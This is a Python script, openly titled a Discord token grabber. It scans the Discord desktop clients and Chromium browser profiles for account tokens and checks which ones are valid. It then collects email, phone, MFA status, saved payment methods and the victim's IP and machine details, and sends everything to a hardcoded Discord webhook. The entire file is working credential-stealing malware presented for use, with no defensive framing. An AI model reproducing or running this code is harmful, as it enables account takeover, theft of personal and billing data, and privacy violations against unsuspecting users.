# Discord Token Grabber — exfiltrates validated tokens to a Discord webhook
# stdlib only (no pip deps): runs on any machine with Python 3.7+
# Usage:  python discord_token_grabber.py

import os
import re
import json
import base64
import getpass
import platform
import urllib.request
import urllib.error

# ============================================================
# CONFIG  — paste YOUR webhook URL here (swap freely)
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1545513447767146596/pD12B7fpfjqc_VFUGFt6afuQBULnoIxznNQyhjuoAFcJrhENo-JvdMaWU5TKjgOdvliY"

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

# Token regexes — Discord user tokens and MFA (login) tokens
TOKEN_RE = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}")
MFA_RE = re.compile(r"mfa\.[\w-]{84}")

BADGE_MAP = {
    1: "Discord Employee",
    2: "Partnered Server Owner",
    4: "HypeSquad Events",
    8: "Bug Hunter Level 1",
    64: "HypeSquad Bravery",
    128: "HypeSquad Brilliance",
    256: "HypeSquad Balance",
    512: "Early Supporter",
    16384: "Bug Hunter Level 2",
    131072: "Early Verified Bot Dev",
    262144: "Active Developer",
    1048576: "Certified Moderator",
    4194304: "Verified Bot",
}

NITRO_MAP = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
COLOR_MAP = {0: 0x5865F2, 1: 0x9B59B6, 2: 0xF0B232, 3: 0xE67E22}


# ------------------------------------------------------------
# Token extraction
# ------------------------------------------------------------
def extract_tokens_from_leveldb(leveldb_dir):
    """Read every .ldb/.log/.json in a leveldb dir and regex out raw tokens."""
    tokens = set()
    if not leveldb_dir or not os.path.isdir(leveldb_dir):
        return tokens
    for fn in os.listdir(leveldb_dir):
        if not fn.endswith((".ldb", ".log", ".json")):
            continue
        fp = os.path.join(leveldb_dir, fn)
        try:
            with open(fp, "rb") as f:
                blob = f.read()
        except Exception:
            continue
        text = blob.decode("utf-8", errors="ignore")
        for m in TOKEN_RE.finditer(text):
            tokens.add(m.group(0))
        for m in MFA_RE.finditer(text):
            tokens.add(m.group(0))
    return tokens


def source_paths():
    """Yield (label, leveldb_path) for every Discord install + browser profile."""
    roaming = os.getenv("APPDATA", "")
    local = os.getenv("LOCALAPPDATA", "")

    # Desktop clients (token lives in plaintext inside Local Storage leveldb)
    desktop = [
        ("Discord", os.path.join(roaming, "discord", "Local Storage", "leveldb")),
        ("Discord Canary", os.path.join(roaming, "discordcanary", "Local Storage", "leveldb")),
        ("Discord PTB", os.path.join(roaming, "discordptb", "Local Storage", "leveldb")),
        ("Discord Dev", os.path.join(roaming, "discorddevelopment", "Local Storage", "leveldb")),
    ]

    # Chromium-family browsers (token in Local Storage leveldb, plaintext)
    browsers = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(roaming, "Opera Software", "Opera Stable")),
        ("OperaGX", os.path.join(roaming, "Opera Software", "Opera GX Stable")),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data")),
    ]

    paths = list(desktop)
    for name, root in browsers:
        if not os.path.isdir(root):
            continue
        for prof in os.listdir(root):
            if prof == "Default" or prof.startswith("Profile"):
                paths.append((f"{name} ({prof})",
                              os.path.join(root, prof, "Local Storage", "leveldb")))
    return paths


# ------------------------------------------------------------
# Discord API helpers
# ------------------------------------------------------------
def _api_get(url, token):
    req = urllib.request.Request(url, headers={
        "Authorization": token,
        "User-Agent": USER_AGENT,
        "Content-Type": "application/json",
    })
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status, r.read()


def validate_token(token):
    """Return the /users/@me dict if the token is alive, else None."""
    try:
        status, body = _api_get("https://discord.com/api/v9/users/@me", token)
        if status == 200:
            return json.loads(body)
    except urllib.error.HTTPError:
        # 401 = dead token, 429 = rate limited
        return None
    except Exception:
        return None
    return None


def get_billing(token):
    """Pull saved payment methods (brand + last4 / PayPal email)."""
    try:
        status, body = _api_get(
            "https://discord.com/api/v9/users/@me/billing/payment-sources", token)
        if status == 200:
            return json.loads(body)
    except Exception:
        pass
    return []


# ------------------------------------------------------------
# Formatting
# ------------------------------------------------------------
def format_badges(flags):
    b = [v for k, v in BADGE_MAP.items() if flags & k]
    return ", ".join(b)


def format_billing(sources):
    out = []
    for s in sources:
        if s.get("type") == 2:  # PayPal
            out.append(f"PayPal: {s.get('email', '?')}")
        else:  # Card
            brand = str(s.get("brand", "Card")).capitalize()
            last4 = s.get("last_4", "????")
            em = s.get("expires_month")
            ey = s.get("expires_year")
            out.append(f"{brand} ••••{last4}  ({em}/{ey})")
    return "\n".join(out)


def get_public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=6) as r:
            return r.read().decode().strip()
    except Exception:
        return "unknown"


def system_info():
    host = platform.node()
    user = getpass.getuser()
    osv = f"{platform.system()} {platform.release()}"
    ip = get_public_ip()
    return f"{host}  |  {user}  |  {osv}  |  IP: {ip}"


def build_embed(token, info, source, sys_info):
    uid = str(info.get("id", "?"))
    uname = str(info.get("username", "?"))
    global_name = info.get("global_name") or uname
    disc = str(info.get("discriminator", "0"))
    premium = info.get("premium_type", 0)

    email = info.get("email") or "None"
    phone = info.get("phone") or "None"
    mfa = bool(info.get("mfa_enabled"))
    verified = bool(info.get("verified"))
    nitro = NITRO_MAP.get(premium, str(premium))
    badges = format_badges(info.get("flags", 0))
    avatar = info.get("avatar")
    color = COLOR_MAP.get(premium, 0x5865F2)

    fields = [
        {"name": "**Token**", "value": f"```\n{token}\n```", "inline": False},
        {"name": "Email", "value": email, "inline": True},
        {"name": "Phone", "value": phone, "inline": True},
        {"name": "Nitro", "value": nitro, "inline": True},
        {"name": "2FA / MFA", "value": str(mfa), "inline": True},
        {"name": "Verified", "value": str(verified), "inline": True},
        {"name": "User ID", "value": uid, "inline": True},
        {"name": "Source", "value": source, "inline": True},
    ]
    if badges:
        fields.append({"name": "Badges", "value": badges, "inline": False})

    billing = get_billing(token)
    bill_str = format_billing(billing)
    if bill_str:
        fields.append({"name": "Billing", "value": bill_str, "inline": False})

    embed = {
        "title": f"{global_name}",
        "description": f"@{uname}" + (f"#{disc}" if disc != "0" else ""),
        "color": color,
        "fields": fields,
        "footer": {"text": sys_info},
    }
    if avatar:
        embed["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png?size=256"}
    return embed


def send_webhook(embed):
    payload = json.dumps({"embeds": [embed]}).encode()
    req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={
        "Content-Type": "application/json",
        "User-Agent": USER_AGENT,
    })
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def send_empty_report(sys_info):
    embed = {
        "title": "Token Grabber — No Tokens Found",
        "description": "No valid Discord tokens located on this machine.",
        "color": 0xED4245,
        "footer": {"text": sys_info},
    }
    send_webhook(embed)


# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
def main():
    print("[+] Discord Token Grabber")
    print(f"[+] Webhook target: {'set' if WEBHOOK_URL else 'MISSING'}")
    sys_info = system_info()
    print(f"[+] Machine: {sys_info}")

    tokens = {}  # token -> source label
    for label, path in source_paths():
        found = extract_tokens_from_leveldb(path)
        if found:
            print(f"[*] {label}: {len(found)} raw token(s)")
        for t in found:
            tokens.setdefault(t, label)

    print(f"[*] Total unique raw tokens: {len(tokens)}")

    valid = []
    for tok in tokens:
        info = validate_token(tok)
        if info:
            print(f"[+] VALID -> {info.get('username')} ({info.get('id')}) [{tokens[tok]}]")
            valid.append((tok, info, tokens[tok]))
        else:
            print(f"[-] dead token skipped")

    if not valid:
        send_empty_report(sys_info)
        print("[-] Nothing valid. Exiting.")
        return

    for tok, info, src in valid:
        embed = build_embed(tok, info, src, sys_info)
        status = send_webhook(embed)
        print(f"[+] Sent {info.get('username')} -> webhook (HTTP {status})")

    print("[+] Done.")


if __name__ == "__main__":
    main()
